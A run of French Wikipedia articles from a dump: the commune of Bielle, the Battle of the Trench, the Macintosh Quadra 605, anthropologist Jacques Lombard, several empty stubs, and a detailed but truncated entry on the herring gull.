La commune est traversée par la route départementale 934.
Risques majeurs.
Le territoire de la commune de Bielle est vulnérable à différents aléas naturels : météorologiques (tempête, orage, neige, grand froid, canicule ou sécheresse), inondations, feux de forêts, mouvements de terrains, avalanche et séisme (sismicité moyenne). Il est également exposé à un risque technologique, la rupture d'un barrage, et à un risque particulier : le risque de radon. Un site publié par le BRGM permet d'évaluer simplement et rapidement les risques d'un bien localisé soit par son adresse soit par le numéro de sa parcelle.
Risques naturels.
Certaines parties du territoire communal sont susceptibles d’être affectées par le risque d’inondation par une crue torrentielle ou à montée rapide de cours d'eau, notamment le gave d'Oloron. La commune a été reconnue en état de catastrophe naturelle au titre des dommages causés par les inondations et coulées de boue survenues en 1982, 1987, 1990, 2007, 2009, 2019 et 2021.
Bielle est exposée au risque de feu de forêt. En 2020, le premier plan de protection des forêts contre les incendies (PDPFCI) a été adopté pour la période 2020-2030. La réglementation des usages du feu à l’air libre et les obligations légales de débroussaillement dans le département des Pyrénées-Atlantiques font l'objet d'une consultation de public ouverte du 16 septembre au 7 octobre 2022.
Les mouvements de terrains susceptibles de se produire sur la commune sont des mouvements de sols liés à la présence d'argile et des affaissements et effondrements liés aux cavités souterraines (hors mines). Afin de mieux appréhender le risque d’affaissement de terrain, un inventaire national permet de localiser les éventuelles cavités souterraines sur la commune.
Le retrait-gonflement des sols argileux est susceptible d'engendrer des dommages importants aux bâtiments en cas d’alternance de périodes de sécheresse et de pluie. 55,5 % de la superficie communale est en aléa moyen ou fort (59 % au niveau départemental et 48,5 % au niveau national). Depuis le , en application de la loi ELAN, différentes contraintes s'imposent aux vendeurs, maîtres d'ouvrages ou constructeurs de biens situés dans une zone classée en aléa moyen ou fort.
La commune est exposée aux risques d'avalanche. Les habitants exposés à ce risque doivent se renseigner, en mairie, de l’existence d’un plan de prévention des risques avalanches (PPRA). Le cas échéant, identifier les mesures applicables à l'habitation, identifier, au sein de l'habitation, la pièce avec la façade la moins exposée à l’aléa pouvant faire office, au besoin, de zone de confinement et équiper cette pièce avec un kit de situation d’urgence.
Risque technologique.
La commune est en outre située en aval de barrages de classe A. À ce titre elle est susceptible d’être touchée par l’onde de submersion consécutive à la rupture de cet ouvrage.
Risque particulier.
Dans plusieurs parties du territoire national, le radon, accumulé dans certains logements ou autres locaux, peut constituer une source significative d’exposition de la population aux rayonnements ionisants. Selon la classification de 2018, la commune de Bielle est classée en zone 2, à savoir zone à potentiel radon faible mais sur lesquelles des facteurs géologiques particuliers peuvent faciliter le transfert du radon vers les bâtiments.
Toponymie.
Le toponyme "Bielle" apparaît sous les formes 
"Vila" (1154, titres de Barcelone), 
"Villa" et "Sen-Viviaa de Bielle" (1355, cartulaire d'Ossau ou "livre rouge"), 
"Biela" (1614, réformation de Béarn).
Son nom béarnais est "Vièla" ou "Bièle".
"L'Aigualade" est une chapelle de Bielle, mentionnée dès 1675 (réformation de Béarn).
Histoire.
Bielle apparait dans les registres paroissiaux pour la première fois en 1154 sous le nom de Vila, puis en 1289 sous le nom de Villa En 1385 c'est le nom de Viele qui apparait, alors constitué de , parmi lesquels celui de « l'espitaü deüs paubres » (Hôpital des pauvres) C'était également un monastère de bénédictins.
Bielle était la capitale de la vallée d'Ossau, en béarnais, « le Capdulh ». Les jurats du Vic d'en haut (Lou Vic Soubirou) et du Vic d'en bas (Lou Vic Juzaa) se réunissaient dans son église. les archives du syndicat pastoral y étaient conservées.
Comme le suggère l'histoire de la toponymie, Bielle, capitale de la vallée d'Ossau, est construite sur l'emplacement d'une villa antique dont les ruines ont été mises au jour en 1842.
Le prieuré Sainte-Marie fondé par Galin, vicomte d'Ossau, au XIe siècle fut totalement détruit par les guerres de religion.
En 1790, Bielle était le chef-lieu d'un canton identique à celui du canton de Laruns d'aujourd'hui, augmenté de Louvie-Juzon, et dépendant du district d'Oloron.
La Marine royale exploita la forêt du Benou, située sur les territoires de Bielle et Bilhères, de 1766 à 1776 (voir Bilhères).
Politique et administration.
Intercommunalité.
La commune fait partie de trois structures intercommunales :
Économie.
L'économie de la commune est essentiellement orientée vers l'agriculture et l'élevage. La fabrication de fromages fermiers est également une des ressources de la commune, qui fait partie de la zone d'appellation de l'ossau-iraty.
À l'exploitation forestière et la production de bois, s'est ajoutée une activité de fabrication de meubles.
Culture locale et patrimoine.
Patrimoine civil.
Le château de Bielle fut construit entre 1766 et 1770 sur commande du marquis Jean-Joseph de Laborde. L'édifice est inscrit aux monuments historiques depuis 2004.
Patrimoine religieux.
L'église Saint-Vivien, du est un édifice classé. Elle recèle du mobilier et des objets classés par les monuments historiques.
La chapelle Notre-Dame, au lieu-dit Ayguelade, du , fut reconstruite au . Elle est inscrite à l'Inventaire général du patrimoine culturel.
Événements sportifs.
La commune se situe sur le trajet de la du Tour de France 2007 qui a eu lieu le 25 juillet. Le parcours de relia Orthez à Gourette - col d'Aubisque.
Équipements.
La commune possède une école maternelle.

</doc>
<doc id="191717" url="https://fr.wikipedia.org/wiki?curid=191717" title="Bataille de la Tranchée">
Bataille de la Tranchée

En 627, la bataille de la Tranchée est un des épisodes de la guerre entre le prophète Mahomet, exilé à Médine, et les habitants de La Mecque qui l'avaient contraint à l'exil en 622. Elle est aussi appelée bataille du Fossé, ou bataille des Coalisés, ce dernier nom se référant à la sourate XXXIII du Coran, "Les Coalisés", qui prophétise le déroulement et l'issue de la bataille. Celle-ci fut très peu sanglante, la mêlée n'ayant pas eu lieu ; elle s'acheva par le retrait des troupes coalisées contre Mahomet, retrait obtenu par la ruse.
Histoire.
Les sources relatant cet événement sont exclusivement musulmanes.
À cause des persécutions que Mahomet et les siens subirent à La Mecque, les musulmans mecquois émigrèrent à Médine (appelée alors Yathrib) en 622. Ce fut le début de l’hégire. Mahomet devint le dirigeant de Médine et rédigea le traité de Médine. Ce traité fut accepté par toutes les tribus de Médine, qu’elles soient arabes ou juives. Un des articles de ce traité oblige toutes les parties de défendre Médine contre toute attaque étrangère. En 624, Mahomet et les siens avaient gagné la bataille de Badr contre les Mecquois. En 625, menés par Abû Sufyân, les Mecquois du clan Quraychite avaient gagné la bataille de `Uhud. Mahomet y passe même pour mort. Après cette bataille, la tribu juive des Banû Nâdir complota pour assassiner Mahomet. En conséquence de cette trahison, ils furent exilés vers Khaybar.
La tribu polythéiste des Quraych de La Mecque (tribu dont le Prophète lui-même est issu) lança une troisième et dernière attaque contre Médine en 627. Ce fut la bataille du Fossé. Les Quraych voulaient se débarrasser une fois pour toutes de la communauté musulmane de Médine et de leur prophète, Mahomet. Ils formèrent une coalition avec plusieurs tribus arabes dont celle des Banu Ghatafan. Composées d’environ et , les armées marchèrent sur Médine. Pour Hichem Djaït, Les leaders juifs de Banu Nadir et les Arabes de Banu Wa'il furent les instigateurs de l'attaque. En revanche Tabarî indique que les Juifs, en grande partie, avaient quitté la région.
Mahomet fut averti de cette attaque et réunit ses compagnons pour discuter de la marche à suivre. Un Perse nommé Salman ( [salmān al-fārisīy]) conseilla à Mahomet de creuser un fossé autour du camp des musulmans afin de briser les charges de cavalerie. Le fossé faisait () de profondeur et de large. Selon différentes sources, il fallut tout un mois pour le creuser ou 6 jours. Cette tactique courante chez les Perses était inconnue des Arabes. Médine étant pourvue de remparts, le fossé ne fut creusé qu’aux endroits où ceux-ci manquaient. Ces remparts étaient gardés par différentes tribus de Médine, dont la tribu juive des Banû Qurayza.
Lorsque le fossé fut fini, Mahomet et son armée de campèrent derrière pour attendre leurs ennemis, les coalisés. Les femmes et les enfants s'étaient réfugiés dans la maison fortifiée du poète médinois Hassân ibn Thâbit. Les armées ennemies arrivèrent et mirent le siège devant la ville. Vingt-six jours passèrent sans qu’aucun véritable combat n’ait été engagé, mis à part des échanges de flèches et des assauts infructueux de la cavalerie des coalisés. Un de ces assauts fut mené par ‘Amr bin ‘Abd Wadd qui avait vaillamment combattu à la bataille de Badr. `Alî et quelques hommes allèrent s’opposer à eux. ‘Amr leur demanda de se battre en duel avec l’un d’entre eux. `Alî accepta le duel et tua ‘Amr bin ‘Abd Wadd (par traîtrise, selon Tabari). 
Après vingt jours de siège, les vivres commencèrent à manquer dans les deux camps. Le prophète Mahomet voulut signer la paix avec l’ennemi pour alléger les souffrances de son peuple. .
Abû Sufyân, un chef des Qurayshites, avait conclu une alliance avec la tribu juive des Banû Qurayza. Ceux-ci avaient accepté de laisser entrer les troupes pour attaquer les musulmans malgré le traité qu’ils avaient signé avec le prophète Mahomet. Un nouveau converti, Nu`aym ibn Mas`ûd vint trouver le prophète Mahomet et lui offrit ses services. Sa conversion n’était pas encore connue de l’ennemi et il alla chez les Banû Qurayza pour essayer de semer la discorde. Il leur fit croire qu'Abu Sufyan risquerait en cas de défaite de les laisser sans protection. Il conseilla donc aux Banû Qurayza de demander des otages en échange du passage. Nu`aym ibn Mas`ûd alla ensuite trouver Abu Sufyan et ses compagnons. Il leur déclara que les Juifs s'étaient repentis de leur conduite envers Mahomet et qu’ils allaient leur demander des otages pour les donner aux musulmans. La ruse de Nu`aym fonctionna et sauva la ville.
Le siège des coalisés fut finalement rompu lorsqu’une tempête ravagea leur camp en épargnant celui de Mahomet. Les musulmans croient que ce fut la conséquence d’une intervention divine.
Le sort de la tribu juive des Banû Qurayza.
Tout de suite après la victoire inattendue des Médinois, Mahomet s’occupa de la traîtrise des Banû Qurayza. 
Après vingt-cinq nuits de siège, les Banû Qurayza acceptèrent de se rendre au jugement de Sa`d ibn Mu`âdh, un membre de la tribu des Banu Aws ("Fils de Aws", Arabe: بنو أوس) allié des Banu Qurayza.. Sa`d fut blessé d’une flèche lors de la bataille du fossé et fut transporté auprès de Mahomet. Il demanda aux deux parties si elles acceptaient son jugement, chose qui fut faite. Sa`d ibn Mu`âdh dit alors « Mon jugement sur les Banû Qurayza sera : que les hommes soient tués, que leurs biens soient répartis entre les musulmans et que les femmes et les enfants soient bannis. ». Mahomet répondit « Ton jugement, Sa`d, est le jugement de Dieu. »
Tous les hommes et des adolescents mâles (plus de six cents personnes) de la tribu des Banû Qurayza furent alors décapités, et les femmes et les enfants réduits en esclavage. Tel est le récit d'Ibn Hischâm qui est la plus ancienne source historique de la vie de Mahomet.
Dans le Coran.
La sourate XXXIII du Coran, "Les Coalisés", aurait prédit cette bataille ; en tout cas, elle évoque son issue tragique pour la tribu des Banû Qurayza. Le terme "coalisés" désigne ici les Quraychites de la Mecque alliés à d'autres tribus arabes et aux tribus juives de Médine qui auraient trahi leur "alliance" avec Mahomet.

</doc>
<doc id="191719" url="https://fr.wikipedia.org/wiki?curid=191719" title="Macintosh Quadra 605">
Macintosh Quadra 605

Le Macintosh Quadra 605 fut celui de la famille "Quadra" le plus abordable ( dans sa configuration de base). Il a entièrement été conçu pour être le moins cher possible : il embarque un processeur 68LC040 à (moins cher et consommant moins que les 68040) et n’a pas de FPU. Il est dans un nouveau boîtier, un peu plus compact que celui des LC II et des LC III.
Il fut commercialisé sous le nom de Macintosh LC 475 pour le marché de l’éducation et de Performa 475 et Performa 476 pour le grand public. La seule différence entre les "Performa 475" et "476" est la taille du disque dur. Le "Quadra 605" fut retiré de la gamme en octobre 1994 alors que les modèles "LC" et "Performa" furent vendus jusqu’en 1996.

</doc>
<doc id="191720" url="https://fr.wikipedia.org/wiki?curid=191720" title="Jacques Lombard">
Jacques Lombard

Jacques Lombard est un anthropologue et cinéaste français (Institut de recherche pour le développement, ex-Orstom), spécialisé dans l'étude de Madagascar et du pays lobi au Burkina Faso.
Ses travaux les plus récents portent sur la place de l'image dans la recherche en sciences sociales (construction des faits et écriture de l'anthropologie) notamment à travers l'étude comparative des phénomènes religieux et sur l'approche des notions d'imaginaire partagé et de « sujet social ».
Filmographie.
Ce film a été présenté dans le cadre de plusieurs séminaires de recherche en 2007 consacré à l’étude des phénomènes de possession ainsi qu’à l’écriture cinématographique.

</doc>
<doc id="191723" url="https://fr.wikipedia.org/wiki?curid=191723" title="Macintosh Performa 475">
Macintosh Performa 475



</doc>
<doc id="191724" url="https://fr.wikipedia.org/wiki?curid=191724" title="Macintosh Performa 476">
Macintosh Performa 476



</doc>
<doc id="191725" url="https://fr.wikipedia.org/wiki?curid=191725" title="Macintosh LC 475">
Macintosh LC 475



</doc>
<doc id="191726" url="https://fr.wikipedia.org/wiki?curid=191726" title="Macintosh Performa 250">
Macintosh Performa 250



</doc>
<doc id="191727" url="https://fr.wikipedia.org/wiki?curid=191727" title="Macintosh Performa 450">
Macintosh Performa 450



</doc>
<doc id="191728" url="https://fr.wikipedia.org/wiki?curid=191728" title="Macintosh Performa 460">
Macintosh Performa 460



</doc>
<doc id="191729" url="https://fr.wikipedia.org/wiki?curid=191729" title="Macintosh Performa 466">
Macintosh Performa 466



</doc>
<doc id="191730" url="https://fr.wikipedia.org/wiki?curid=191730" title="Macintosh Performa 467">
Macintosh Performa 467



</doc>
<doc id="191731" url="https://fr.wikipedia.org/wiki?curid=191731" title="Bataille de Iéna">
Bataille de Iéna



</doc>
<doc id="191733" url="https://fr.wikipedia.org/wiki?curid=191733" title="Macintosh Performa 520">
Macintosh Performa 520



</doc>
<doc id="191734" url="https://fr.wikipedia.org/wiki?curid=191734" title="Paix de Westphalie">
Paix de Westphalie



</doc>
<doc id="191735" url="https://fr.wikipedia.org/wiki?curid=191735" title="Goéland argenté">
Goéland argenté

Le Goéland argenté (Larus argentatus) est une espèce d'oiseaux de mer européens de taille moyenne de la famille des Laridae. Blanc à dos gris, il est génétiquement proche des autres goélands à tête blanche du genre "Larus". Mâle et femelle sont presque identiques, mais le juvénile possède un plumage très différent et met quatre ans à acquérir son plumage d'adulte.
La taxonomie du goéland argenté, très complexe, a subi depuis la fin du des modifications importantes qui sont encore en discussion. Notamment, le goéland hudsonien vivant en Amérique du Nord, et le goéland de la Véga, asiatique, ont été séparés du goéland argenté européen, ou goéland argenté "sensu stricto", depuis le début du .
Bon voilier et bon marcheur, le goéland est un omnivore opportuniste à tendance carnivore, qui n'hésite pas à devenir charognard, ou à pratiquer le cleptoparasitisme, voire le cannibalisme. Oiseau sociable, il niche en colonie et produit chaque année deux ou trois oisillons qui, s'ils parviennent à l'âge adulte, auront une probabilité de survie particulièrement élevée.
Les populations de goélands argentés ont connu une forte augmentation tout au long du . Cela a eu pour conséquence des heurts avec l'espèce humaine au niveau local, ou un impact négatif sur l'environnement, suscitant des opérations de régulation à l'échelle locale ou régionale. En dépit d'une stabilisation des effectifs au cours des dernières décennies, voire de déclins dans certaines régions, le goéland argenté reste un oiseau de mer très commun sur les côtes de France et de la plupart des pays de l'Europe de l'Ouest.
Description morphologique.
Aspect de l'adulte.
Cet oiseau essentiellement blanc et gris a un corps assez puissant, et relativement court par rapport à la longueur de ses ailes. Tout comme de nombreux genres d'oiseaux de mer, aptes à planer aussi bien au ras de l'eau qu'en altitude, il a une envergure importante et des ailes étroites. Les pattes courtes, le bec comprimé latéralement, avec l'arête de la mandibule supérieure courbe, dénotent un oiseau de la famille des Laridés. La corpulence, la longueur égale des plumes de la queue (rectrices), le bec fort et légèrement crochu au bout ainsi que le motif des couleurs sur les rémiges primaires sont caractéristiques du genre "". La couleur gris moyen du dos, la couleur blanc pur de la tête, du cou, de la gorge et de la face inférieure, l'arête de la mandibule inférieure faisant un angle marqué, ainsi que les marques noires et blanches à l'extrémité de chaque aile, constituent des éléments caractéristiques de l'espèce. Le bec est jaune et présente une tache rouge sur la mandibule inférieure. La couleur des pattes palmées est rose chair. L'iris de l'œil est jaune pâle.
Le ton de gris du dos et l'importance des marques blanches et noires à la pointe des ailes, c'est-à-dire à l'extrémité des rémiges primaires sont variables selon les sous-espèces.
Le plumage éclipse se met en place par une mue complète se déroulant entre mai et octobre. Il se caractérise par des stries longitudinales brun-gris sur la tête et la nuque. Cette modification du plumage est accompagnée d'une très légère modification de la couleur du bec et des pattes, qui deviennent un peu plus ternes. Ces stries disparaissent après une mue partielle qui se déroule entre janvier et avril, pour faire de nouveau place au plumage nuptial ; le bec et les pattes reprennent alors des couleurs plus vives.
Il n'y a pas de différence de plumage entre mâles et femelles, mais ces dernières sont généralement de dimensions plus réduites. Le goéland argenté mesure entre 55 et de longueur pour une envergure de 130 à , et pour un poids variant de 750 à . L'aile pliée mesure entre 410 et chez le mâle, et entre 390 et chez la femelle. La longueur de la queue varie de 160 à , celle du bec de 47 à et celle du tarse entre 63 et .
Du plumage juvénile au plumage adulte.
Il faut plus de quatre ans au goéland argenté pour acquérir son plumage adulte. Il doit pour cela passer par plusieurs plumages et plusieurs mues :
Le plumage juvénile remplace le duvet de l'oisillon et se met en place avant même le premier envol. Ce plumage est couvert de taches et mouchetures ressemblant à des écailles brunes, particulièrement au niveau de la tête, du cou et de la poitrine, ce qui confère à l'oiseau un aspect nettement plus sombre et brun que celui de l'adulte. Le bec est noir et l'iris de l'œil brun foncé. Ces premières plumes sont de qualité médiocre, l'essentiel de la dépense énergétique étant destiné à la croissance du jeune goéland. Elles sont par conséquent particulièrement sensibles à l'usure et à la dégradation par les ultraviolets, et ont tendance à pâlir et ternir au cours du temps. À partir de ce stade, les jeunes, sont appelés « grisards », plumage commun à quelques nuances près, aux différentes espèces de goélands à tête blanche, ce qui les rend souvent difficiles à distinguer.
Au cours du premier hiver, les plumes du manteau subissent une première mue, mais le plumage reste marqué de brun. Quelques plumes plus pâles commencent à apparaître sur la tête, le cou et la poitrine, le plumage étant ainsi plus sombre en automne qu'en fin d'hiver. La base du bec commence à rosir.
Lors du deuxième hiver, les rémiges primaires muent pour la première fois. Ce phénomène achève la première mue complète du plumage, débutée au cours de l'été. La tête, le cou et la poitrine, bien que plus clairs, peuvent chez certains individus encore être fortement striés de brun. Plusieurs plumes du manteau sont teintées du gris du plumage adulte, en nombre variable selon les individus de cet âge. Le bec est beaucoup plus rose désormais, mais son extrémité est encore tachée de noir. L'iris commence parfois à s'éclaircir et à prendre la couleur jaune.
Le plumage de troisième hiver subit une nouvelle mue complète : les rémiges primaires acquièrent des marques blanches, et la majorité des plumes du manteau et les couvertures alaires deviennent grises. Les rectrices sont partiellement blanches, terminées d'une bande de couleur brun-noir. La tête, le cou et la poitrine sont désormais presque blancs mais restent plus ou moins striés de traits bruns. L'iris est devenu jaune, parfois encore ponctué de sombre. Des taches noires persistent sur le bec, qui commence à jaunir.
Au cours du quatrième hiver, une nouvelle mue complète fait apparaître un plumage quasiment identique à celui d'un adulte. Le dos est alors gris, la tête, le cou et la poitrine sont blancs, le bec jaune et une tache dans un premier temps orangée apparaît près de l'extrémité de la mandibule inférieure. Un bec terne ou marqué de quelques taches noires, ou encore quelques stries brunes persistant même en été sur la tête ou le cou trahissent souvent la jeunesse d'un adulte.
Espèces similaires.
Le goéland argenté fait partie d'un complexe d'espèces récemment considérées comme distinctes sur la base d'études de génétique moléculaire, mais dont l'apparence est très semblable à celle du goéland argenté "". Les critères d'identification dans la nature portent généralement sur la couleur des pattes (roses ou jaunes selon les cas) et la teinte du manteau ; par ailleurs, les aires de répartition sont généralement bien distinctes. Le goéland de la Véga, qui vit en Sibérie, a un manteau un peu plus sombre. En hiver, la tête est davantage tachée de brun, notamment la nuque et les côtés du cou, où les taches forment une sorte de collier. Les pattes sont d'un rose plus intense et les yeux, entourés d'un cercle de peau plus rouge, peuvent être de couleur variable ; on note par exemple un nombre important d'yeux sombres. Le goéland hudsonien, qui vit en Amérique du Nord, est un peu plus grand que la sous-espèce "L. a. argenteus", et moins sombre que "L. a. argentatus". Il a de plus une tache allongée grise sur les , et primaires, ainsi que des marques noires sans point blanc sur les et .
De toutes ces espèces extrêmement proches, le goéland leucophée, dont l'aire de répartition est en cours d'extension vers le nord jusqu'au sud des îles Britanniques, est le plus susceptible d'être confondu, en Europe, avec le goéland argenté. Il ne se distingue de ce dernier que par ses pattes jaunes plutôt que roses et par un dos d'un gris un peu plus soutenu.
Dans le groupe des goélands à tête blanche, et de taille voisine, les goélands bourgmestre et arctique peuvent aussi être confondus avec le goéland argenté ; ils ne possèdent toutefois pas de marques noires au bout des ailes. Le juvénile du goéland brun est presque identique à celui du goéland argenté, mais ce dernier présente en vol une zone plus pâle sur l'aile, absente chez le jeune goéland brun. De parenté moins proche, mais appartenant au même genre, le goéland cendré peut lui aussi être confondu avec le goéland argenté, mais il a les yeux noirs et non jaunes, les pattes jaune-verdâtre et non roses, il est plus petit et son bec ne porte pas de tache rouge visible.
Comportement.
Vol.
Cet oiseau survole le littoral en vol plané, ailes étendues et tenues légèrement arquées, queue étalée. Le vol battu est puissant, aux battements soutenus. La vitesse moyenne de vol est d'environ .
Le goéland recherche souvent sa nourriture en marchant ou parfois en courant. Sa démarche est aisée, à peine dandinée, ses pas sont amples et ses enjambées font plus de de longueur.
Il est par contre un assez piètre nageur pour un oiseau de mer : il se contente le plus souvent de flotter ou nager en surface. Il ne plonge guère à la poursuite de ses proies, même s'il est capable de s'immerger partiellement pour saisir des proies situées à faible profondeur.
Alimentation.
Régime alimentaire.
Le goéland argenté est une espèce opportuniste qui consomme aussi bien du poisson que des invertébrés marins (mollusques, crustacés, polychètes, échinodermes…). Il consomme aussi des animaux capturés sur le continent, tels que des insectes et des vers de terre, des œufs d'oiseaux ou des poussins, et même de petits mammifères. Le goéland argenté exerce une forte pression de prédation sur les autres oiseaux de mer, notamment sur ceux nichant en colonie tels que les guillemots, sternes ou macareux, ainsi que sur d'autres espèces d'oiseaux (canards, limicoles…) qui nichent à proximité. Il n'hésite pas non plus à attraper un œuf ou un oisillon d'un autre goéland, y compris de son espèce, s'ils sont laissés sans surveillance. Sur certaines îles de la Frise orientale, comme Spiekeroog, ce sont jusqu'à sur 10 qui sont victimes de cannibalisme. Ce taux de cannibalisme élevé peut être induit par des conditions particulières, notamment un stress alimentaire, le taux augmentant lorsque les températures de surface des eaux augmentent (ce qui diminue la productivité primaire et conduit au déplacement des poissons vers des eaux plus profondes). Mais il peut aussi être charognard ou se nourrir de déchets de poisson rejetés en mer par les bateaux de pêche, ou encore d'ordures récoltées dans les décharges publiques, voire à la sortie des égouts. Il se nourrit aussi de produits végétaux, comme des baies, des tubercules (par exemple des navets) ou des graines.
Cette grande diversité dans le régime alimentaire semble surtout valable à l'échelle de l'espèce : les individus ont souvent des comportements alimentaires plus spécialisés, et parfois assez étroitement limités. Une étude menée en rade de Brest a d'ailleurs montré que les femelles se nourrissaient plus volontiers de lombrics, alors que les mâles étaient dominants sur les décharges.
Mode d'alimentation.
Il capture ses proies soit en marchant, soit en nageant en surface, mais ne plonge guère à leur poursuite. Au mieux, il lui arrive, au cours d'une pêche à pied le long de la plage, de se jeter dans une vague pour capturer une proie ou de s'immerger partiellement pour saisir des proies situées à faible profondeur, technique qu'il utilise régulièrement pour récupérer les déchets rejetés par les bateaux de pêche ; dans ce cas, seule l'extrémité des ailes reste émergée.
Il lui arrive aussi très souvent de dérober les proies capturées par d'autres oiseaux de mer (poissons ou crustacés volés aux petites aigrettes et sternes), soit en les harcelant jusqu'à ce qu'ils lâchent leur butin, soit en subtilisant leur proie après leur atterrissage : ce comportement est appelé cleptoparasitisme.
Il sait ouvrir les coquillages en les laissant tomber d'une dizaine de mètres de hauteur, espérant qu'ils se brisent sous le choc, et n'hésitant pas à recommencer jusqu'à ce qu'il ait obtenu le résultat désiré. Il ne choisit cependant pas toujours pour cela une surface dure, et ses proies disparaissent parfois dans l'eau ou le sable.
Tout comme de nombreuses autres espèces d'oiseaux, il rejette régulièrement par le bec des pelotes de réjection composées des parties dures et indigestes issues des proies. Ces pelotes mesurent en moyenne 20 × , mais peuvent parfois être plus volumineuses.
Ce goéland ne boit de l'eau douce que lorsque celle-ci est disponible. Autrement, il est capable de boire de l'eau de mer et rejette l'excès de sel grâce à des glandes excrétrices situées au-dessus des yeux et débouchant dans les narines. Le liquide saturé en sel tombe alors de son bec sous forme de gouttes.
Relations sociales.
Pour les relations avec l'homme, voir le paragraphe correspondant.
Vocalisations.
Le goéland argenté est un oiseau bruyant qui possède toute une gamme de cris sonores et stridents ressemblant à des jappements ou des cris plaintifs. Ce goéland crie souvent, à de nombreuses occasions, et tout au long de la journée. On dit qu'il pleure ou raille. Il peut aussi pousser de grandes clameurs éclatantes du genre "aow-kayïï-kao-kao-kao-kao", des cris sonores en "iaou" ou en "ga-ga-ga".
Comportement grégaire.
Cet oiseau très sociable quelle que soit la saison se nourrit et niche le plus souvent en groupe, voire en colonie. Les bandes de goélands argentés peuvent regrouper de quelques dizaines à quelques milliers d'individus. Cependant, au sein même de la colonie, la distance minimale tolérée entre deux nids est d'environ et chaque couple s'octroie un territoire mesurant d'une dizaine à une centaine de mètres carrés, à l'intérieur duquel tout intrus, y compris humain, est attaqué. Cette défense du territoire est assurée aussi bien par le mâle que par la femelle.
La sociabilité du goéland argenté peut s'étendre à d'autres espèces d'oiseaux de mer, avec lesquelles il se mêle volontiers, et il n'est pas rare de voir, sur une zone d'alimentation, des goélands argentés mêlés à diverses autres espèces de goélands, de mouettes ou de sternes. De même, ce goéland niche souvent à proximité d'autres espèces d'oiseaux de mer nichant en colonie (autres espèces de goélands, sternes, ou guillemots par exemple).
Reproduction.
Cycle.
Comme chez la plupart des oiseaux de mer, la saison de reproduction s'étale sur une longue période. La reproduction proprement dite, c'est-à-dire la ponte et l'élevage de la nichée, se déroule d'avril à juillet ; mais elle est précédée par une longue phase d'appropriation des territoires et de formation des couples.
Les dates d'arrivée aux sites de nidification varient avec la latitude : elles sont plus précoces au sud. Ainsi, les goélands argentés sont observés sur leurs territoires au plus tard dès décembre dans le Finistère et au cap Blanc-Nez, début janvier en mer d'Irlande et début mars dans le sud de la Baltique. Les retours sont même signalés dès novembre au pays de Galles.
Schématiquement, les mois précédant la ponte proprement dite, c'est-à-dire approximativement de janvier à avril, sont consacrés à l'appropriation et à la délimitation des territoires, à la formation des couples et à l'accouplement, enfin à la construction du nid. Mai est le mois des pontes et de l'incubation pour la majorité des couples, juin et juillet ceux de l'élevage des jeunes. Les oiseaux quittent progressivement les sites de reproduction dans le courant du mois d'août, les colonies étant pratiquement désertes à la fin de ce mois.
Appariement.
Le moment et la durée du processus de formation des couples dépendent du statut des individus. Dans un certain nombre de cas, le couple est déjà constitué au moment de l'arrivée : il s'agit généralement d'individus âgés, ayant acquis antérieurement une expérience de la reproduction et retrouvant leur partenaire de l'année précédente. La règle pour l'espèce est la monogamie et la fidélité au partenaire d'une année à l'autre.
La formation d'un nouveau couple ne se pose donc que pour les jeunes qui accèdent pour la première fois au statut de reproducteur, et aux reproducteurs expérimentés dont le partenaire a disparu depuis la saison précédente et aux cas de séparation (souvent dus à une saison de reproduction infructueuse).
Des comportements à composante sexuelle apparaissent dès les premiers stades de la formation des couples, mais ils culminent dans les semaines précédant la ponte. Les deux comportements les plus caractéristiques de cette période sont le « nourrissage de cour » et les accouplements. Dans un cas comme dans l'autre, c'est la femelle qui a l'initiative : adoptant une posture, des mouvements et des cris très semblables à ceux des poussins lorsqu'ils quémandent leur nourriture auprès des adultes, elle sollicite le nourrissage ou l'accouplement de la part du mâle. Comportement très ritualisé, le nourrissage de cour n'en est pas moins effectif, les quantités de nourriture passant du mâle à la femelle étant parfois très importantes ; son rôle énergétique est indéniable au moment où les œufs sont en cours de formation. Par ailleurs, les mâles les plus efficaces à cet égard sont généralement aussi ceux qui s'investissent le plus dans l'élevage des poussins. Comme chez les autres goélands, le mâle émet un cri particulier pendant toute la durée de l'accouplement.
Nidification.
Le goéland argenté niche au sol, sur les îlots, les corniches des falaises continentales, dans les dunes, les landes basses ou les tourbières, voire sur les toits de bâtiments urbains, en groupes ou colonies comportant de quelques dizaines à plusieurs milliers de couples. Quoique occupant très fréquemment les mêmes espaces de reproduction que les goélands bruns, les deux espèces diffèrent dans leurs exigences précises : le goéland argenté domine sur les côtes escarpées et les espaces découverts alors que le brun affectionne plutôt les îlots bas, en particulier les zones couvertes d'une végétation haute (fougères, buissons…) dans lesquelles l'argenté pénètre exceptionnellement.
Le nid, de dimensions variables, est constitué de matériaux divers rassemblés par les deux partenaires, le mâle étant généralement plus actif dans cette activité : herbes, brindilles, petites racines et algues pour l'essentiel, mais aussi fragments de plastique, graviers, coquillages, plumes, etc. Il est installé dans un creux du terrain, préexistant ou creusé avec les pattes dans la terre ou le sable.
Ponte et incubation.
La ponte n'a lieu qu'une fois par an, au printemps, vers les mois d'avril ou mai. Les pontes les plus précoces ont été notées un au Danemark, un en Bretagne, un en mer d'Irlande, un en Norvège et un en Écosse.
La femelle pond le plus souvent trois œufs de couleur variable (blanc verdâtre, beige ou beige verdâtre) mais toujours tachetés de brun. Le pourcentage de pontes à trois œufs varie de 78 % à 91 % selon les études. Ces œufs mesurent en moyenne 71 × , avec pour valeurs extrêmes 58,0- × 44,1-, pour une masse moyenne de (dont 7 % de coquille). Des études tendent à montrer que plus la femelle est bien nourrie avant la ponte, plus les œufs auront des dimensions moyennes élevées, et plus les petits seront vigoureux. Les œufs sont pondus à intervalles irréguliers, généralement de un à trois jours, le plus souvent de deux jours.
La couvaison, assurée par les deux parents, dure de 28 à . Elle ne devient continue que lorsque la ponte est complète ; le nid est toutefois surveillé en permanence dès le premier œuf, l'adulte de garde pouvant alors rester de longs moments à quelques pas de là. À intervalles irréguliers, le parent qui couve tourne les œufs au moyen du bec et des pattes.
Élevage.
Les poussins pèsent environ à l'éclosion. Ils sont couverts d'un duvet beige, teinté de gris sur le dos, et parsemé de quelques taches brun-noir, ce qui constitue un plumage cryptique. Leur iris est brun-noir, leurs pattes rosées, et leur bec, gris sombre à la base, est beige-rosé à l'extrémité.
